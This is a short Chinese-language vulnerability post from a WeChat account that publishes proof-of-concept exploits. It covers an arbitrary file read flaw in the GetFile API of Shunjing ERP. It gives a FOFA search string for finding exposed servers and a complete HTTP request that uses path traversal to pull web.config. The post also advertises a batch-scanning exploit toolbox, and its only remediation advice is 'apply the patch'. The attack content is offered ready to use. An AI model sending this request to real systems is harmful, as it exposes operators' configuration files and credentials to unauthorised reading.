#  顺景ERP GetFile接口存在任意文件读取漏洞 附POC   
2024-11-27更新  南风漏洞复现文库   2024-11-27 15:14  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 顺景ERP简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
顺景ERP  
## 2.漏洞描述  
  
顺景ERP GetFile接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
顺景ERP  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO2t8hehdeTF0KiaX2K7KK1OYTaTcHZaibD1ibusWiaWJ5GSmuOLztEGsmwoQ/640?wx_fmt=png&from=appmsg "null")  
  
顺景ERP GetFile接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="/api/DBRecord/getDBRecords"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/api/Download/GetFile?FileName=../web.config&Title=123  
  
漏洞数据包：  
```
GET /api/Download/GetFile?FileName=../web.config&Title=123 HTTP/1.1
Host: xx.xx.xx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO2avvEjiagpJfpHQONQKcEE7uFBIoXTNWOIOuLoSacOiax8pib26EsrwE5Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO2btFTld3SLGYn0KZl5sxbzKsibwhLxqcfT4fDW3iaVrIkJThNX7ZibKibcw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO29Fx0fB8Voe1GuS9UK7aqTcOUdiaFiaDSLoDAh3axjxjpHUTmSLp7f5RA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO2qCbBBJHftYuOgHc2fS4GtVDKvaZYdwygA7Erqfl2TUrh2yfhZaf89A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO2ZdB2jLHYr7Ge46b4ETSHNAjicgacqssEGWA77bgPvkE0QJE26EGQO4g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bMyDU28yZr1LmtNCH1mVO22q3XTgHaHjuvV9xcaohrjx8ia9lYo3LDtPNbia2Z1xZunCrxp2XaSasw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[D-Link多款产品sc_mgr.cgi接口存在远程命令执行漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487857&idx=1&sn=6c19cce2a96593609bc7ac4d28ad17b5&scene=21#wechat_redirect)  
  
  
[用友NC process接口存在SQL注入漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487845&idx=1&sn=74f2e12a7ee52cc1c5b172b92996f7de&scene=21#wechat_redirect)  
  
  
